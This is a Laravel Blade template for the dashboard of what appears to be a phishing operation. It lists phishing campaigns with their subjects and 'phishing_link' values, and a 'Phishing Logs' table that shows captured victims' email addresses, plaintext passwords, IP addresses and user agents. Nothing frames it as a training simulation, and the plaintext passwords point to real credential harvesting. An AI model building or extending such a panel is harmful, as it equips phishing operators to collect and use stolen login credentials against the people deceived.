@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row mb-4">
        <div class="col">
            <h2>Dashboard</h2>
            @if (session('status'))
                <div class="alert alert-info" role="alert">{{ session('status') }}</div>
            @endif
        </div>
    </div>

    <div class="row">
        <div class="col-md-6">
            <div class="card mb-4">
                <div class="card-header">Campaigns</div>
                <div class="card-body">
                    <a class="btn btn-sm btn-primary mb-3" href="{{ route('campaigns.index') }}">Manage Campaigns</a>

                    <div class="table-responsive">
                        <table class="table table-striped">
                            <thead>
                                <tr>
                                    <th>Subject</th>
                                    <th>Link</th>
                                    <th>Created</th>
                                </tr>
                            </thead>
                            <tbody>
                                @forelse($campaigns as $campaign)
                                    <tr>
                                        <td>{{ $campaign->subject }}</td>
                                        <td>{{ $campaign->phishing_link }}</td>
                                        <td>{{ $campaign->created_at->format('M j, Y g:i A') }}</td>
                                    </tr>
                                @empty
                                    <tr>
                                        <td colspan="3">No campaigns yet.</td>
                                    </tr>
                                @endforelse
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-md-6">
            <div class="card mb-4">
                <div class="card-header">Phishing Logs</div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-striped">
                            <thead>
                                <tr>
                                    <th>Email</th>
                                    <th>Password</th>
                                    <th>IP Address</th>
                                    <th>User Agent</th>
                                    <th>Date</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                @forelse($logs as $log)
                                    <tr>
                                        <td>{{ $log->email }}</td>
                                        <td>{{ $log->password }}</td>
                                        <td>{{ $log->ip_address }}</td>
                                        <td>{{ $log->user_agent }}</td>
                                        <td>{{ $log->created_at->format('M j, Y g:i A') }}</td>
                                        <td>
                                            <form action="{{ route('phishing-logs.destroy', $log->id) }}" method="POST" onsubmit="return confirm('Are you sure you want to delete this log?')">
                                                @csrf
                                                @method('DELETE')
                                                <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                            </form>
                                        </td>
                                    </tr>
                                @empty
                                    <tr>
                                        <td colspan="6">No logs yet.</td>
                                    </tr>
                                @endforelse
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection